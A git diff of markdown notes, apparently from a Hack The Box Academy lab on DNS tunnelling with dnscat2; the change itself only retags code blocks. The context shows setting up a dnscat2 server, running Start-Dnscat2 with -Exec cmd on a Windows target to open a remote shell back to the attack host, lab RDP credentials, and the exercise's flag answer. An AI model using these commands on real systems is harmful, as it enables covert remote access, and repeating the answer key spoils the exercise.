@@ -4,7 +4,7 @@
 ## Setting up & Using dnscat2
 ### Cloning dnscat2 and Setting Up the Server
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ git clone https://github.com/iagox86/dnscat2.git
 masterofblafu@htb[/htb]$ cd dnscat2/server/
 masterofblafu@htb[/htb/dnscat2/server/]$ sudo gem install bundler
@@ -13,7 +13,7 @@ masterofblafu@htb[/htb/dnscat2/server/]$ sudo bundle install
 
 ### Starting the dnscat2 server
 
-```sh
+```shellsession
 masterofblafu@htb[/htb/dnscat2/server/]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
 
 New window created: 0
@@ -44,7 +44,7 @@ After running the server, it will provide us the secret key, which we will have 
 
 ### Cloning dnscat2-powershell to the Attack Host
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ git clone https://github.com/lukebaggett/dnscat2-powershell.git
 ```
 ### Import dnscat2.ps1
@@ -64,7 +64,7 @@ We must use the pre-shared secret (`-PreSharedSecret`) generated on the server t
 
 ### Confirming Session Establishment
 
-```sh
+```shellsession
 New window created: 1
 Session 1 Security: ENCRYPTED AND VERIFIED!
 (the security depends on the strength of your pre-shared secret!)
@@ -75,7 +75,7 @@ dnscat2>
 ### Listing dnscat2 Options
 We can list the options we have with dnscat2 by entering `?` at the prompt.
 
-```sh
+```shellsession
 dnscat2> ?
 
 Here is a list of commands (use -h on any of them for additional help):
@@ -94,7 +94,7 @@ Here is a list of commands (use -h on any of them for additional help):
 
 ### Interacting with the Established Session
 
-```sh
+```shellsession
 dnscat2> window -i 1
 New window created: 1
 history_size (session) => 1000
@@ -120,7 +120,7 @@ exec (OFFICEMANAGER) 1>
 RDP to **10.129.42.198** (ACADEMY-PIVOTING-WIN10PIV), with user `htb-student` and password `HTB_@cademy_stdnt!`
 1. Using the concepts taught in this section, connect to the target and establish a DNS Tunnel that provides a shell session. Submit the contents of C:\Users\htb-student\Documents\flag.txt as the answer. **Answer: AC@tinth3Tunnel**
    - Cloning and setting up the dnscat2 server:
-        ```sh
+        ```shellsession
         masterofblafu@htb[/htb]$ git clone https://github.com/iagox86/dnscat2.git
         masterofblafu@htb[/htb]$ cd dnscat2/server/
         masterofblafu@htb[/htb/dnscat2/server/]$ sudo gem install bundler
@@ -151,7 +151,7 @@ RDP to **10.129.42.198** (ACADEMY-PIVOTING-WIN10PIV), with user `htb-student` an
         will connect directly on UDP port 53.
         ```
    - Cloning and transfer dnscat2-powershell to the target host via shared drive in xfreerdp:
-        ```sh
+        ```shellsession
         masterofblafu@htb[/htb]$ git clone https://github.com/lukebaggett/dnscat2-powershell.git
         masterofblafu@htb[/htb/dnscat2-powershell]$ xfreerdp /v:10.129.42.198 /u:htb-student /p:HTB_@cademy_stdnt! /drive:linux,/home/htb-ac-1863259/dnscat2-powershell
         ```
@@ -160,7 +160,7 @@ RDP to **10.129.42.198** (ACADEMY-PIVOTING-WIN10PIV), with user `htb-student` an
         PS C:\Users\htb-student\Desktop> Start-Dnscat2 -DNSserver 10.10.15.159 -Domain inlanefreight.local -PreSharedSecret eb45cfef94f0967ecffd7850cc7683a9 -Exec cmd  
         ```
    - Interact with the session at our attack host and read the flag:
-        ```sh
+        ```shellsession
         dnscat2> New window created: 2
         Session 2 Security: ENCRYPTED AND VERIFIED!
         (the security depends on the strength of your pre-shared secret!)
